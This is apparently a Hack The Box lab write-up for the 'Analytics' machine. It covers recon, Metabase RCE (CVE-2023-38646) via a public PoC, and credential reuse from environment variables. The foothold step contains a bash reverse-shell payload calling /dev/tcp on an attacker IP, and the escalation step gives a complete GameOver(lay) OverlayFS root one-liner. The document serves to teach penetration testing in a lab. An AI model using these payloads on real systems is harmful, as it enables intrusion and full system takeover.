---
title: "Analytics"
difficulty: Easy
os: Linux
points: 20
rating: 4.1
date: 2023-10-07
avatar: assets/htb/analytics.png
tags: [Remote Code Execution, Clear Text Credentials, Information Disclosure, Insecure Design, Reconnaissance, Configuration Analysis, Password Reuse, Kernel Exploitation]
htb_url: https://app.hackthebox.com/machines/Analytics
---

## Summary

Analytics is an Easy Linux (Ubuntu 22.04) machine. The web server hosts a Metabase instance (v0.46.6) on a subdomain that is vulnerable to a pre-authentication remote code execution flaw (CVE-2023-38646), which I leveraged to land a shell inside the Metabase container. Credentials leaked through environment variables let me pivot to the `metalytics` user over SSH, and a dated kernel left the host exposed to the GameOver(lay) OverlayFS privilege escalation (CVE-2023-2640 / CVE-2023-32629), giving me root.

## Enumeration

Before scanning I added the target to my hosts file and set up a working directory for the box and its outputs. The last `sed` line is just cleanup to drop the hosts entry at the end of the engagement.

```bash
su
echo "<YOUR_IP> analytics.htb" >> /etc/hosts

mkdir -p htb/analytics.htb
cd htb/analytics.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

My usual first move in recon is to ping the target, which confirms it's reachable and gives a hint about the OS.

```bash
ping -c 3 analytics.htb
PING analytics.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=64.4 ms
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=67.6 ms
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=59.7 ms
```

After three ICMP replies, the Time To Live (TTL) sits near 64, which points to a \*nix host; Windows machines typically report a TTL closer to 128.

A full TCP port sweep then maps out what's listening.

```bash
nmap -p0- -sS -Pn -vvv analytics.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The scan shows just two open TCP ports on the host: 22 and 80.

Next, I run a tighter scan with the `-sCV` flags to grab service versions and run the common scripts.

```bash
nmap -p22,80 -sS -Pn -n -v -sCV -T4 analytics.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  tcpwrapped
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With no SSH credentials in hand, I start with port 80.

### Web enumeration

The `http-title` reveals a new subdomain, <http://analytical.htb/>, and hitting the HTTP port returns a 302 redirect over to `analytical.htb` (which I confirmed through Burp Suite). To resolve it I add `analytical.htb` to my `/etc/hosts` file.

Inspecting the page source then turns up another subdomain serving a different application: a login page at `data.analytical.htb`. I add that entry to `/etc/hosts` as well.

Whether I run WhatWeb or just look at the page, it's clear a Metabase web application is running there.

```bash
whatweb http://data.analytical.htb/
http://data.analytical.htb/ [200 OK] Cookiesetabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnlyetabase.DEVICE], IP[<YOUR_IP>], Script[application/json], Strict-Transport-Securityax-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Both WhatWeb and the nmap scan can surface the Metabase version, but the quickest route is reading the page's source code, which shows the instance is running **v0.46.6**. That version is vulnerable to **CVE-2023-38646**, a pre-authentication remote code execution flaw.

## Foothold

The exploit abuses the `/api/setup/validate` endpoint together with the instance's `setup-token`. The `setup-token` is exposed in the page source (and via the `/api/session/properties` endpoint):

```
249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

I used a public Python PoC for the CVE. The script needs the **target URL**, the **setup token**, and a **command** to execute, following the usage:

```
python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
```

The command will be run on the target with the intention of returning a reverse shell — there are plenty of options at [RevShells](https://revshells.com/). First I set up a netcat listener on port 1339 on my attacker box.

```
nc -nvlp 1339
```

Then I save the exploit locally and fire it off with a bash reverse-shell payload.

```
python3 exploit.py -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -u "http://data.analytical.htb" -c "bash -i >& /dev/tcp/10.10.14.6/1339 0>&1"
```

The listener catches the connection and I'm in, running as the **metabase** user.

### Pivoting to metalytics

`sudo -l` shows I have no sudo rights from this shell. However, listing the environment variables with `export` reveals credentials — the password for the `metalytics` user is stored in the **META\_PASS** environment variable. Since port 22 (SSH) was open, I reuse those credentials to log in properly.

```
ssh metalytics@analytics.htb
```

```
cat user.txt
5d03************************97b9
```

## Privilege Escalation

With a stable SSH session as `metalytics`, I check the host details:

```
uname -a
```

This reports kernel **6.2.0-25-generic**, and `lsb_release -a` / `cat /etc/os-release` confirms the system is running **Ubuntu 22.04.03 LTS (Jammy)**.

That dated kernel and Ubuntu release combination is vulnerable in its **OverlayFS** component — the GameOver(lay) privilege escalation, assigned two 2023 CVEs (CVE-2023-2640 and CVE-2023-32629). Following the public PoC, I run the GameOver(lay) one-liner, which copies a setuid-capable `python3` into an overlay mount and uses it to drop a root-owned setuid `bash`.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

This lands a root shell, putting the final flag within reach.

```
cat root.txt
2ec3************************a477
```

---
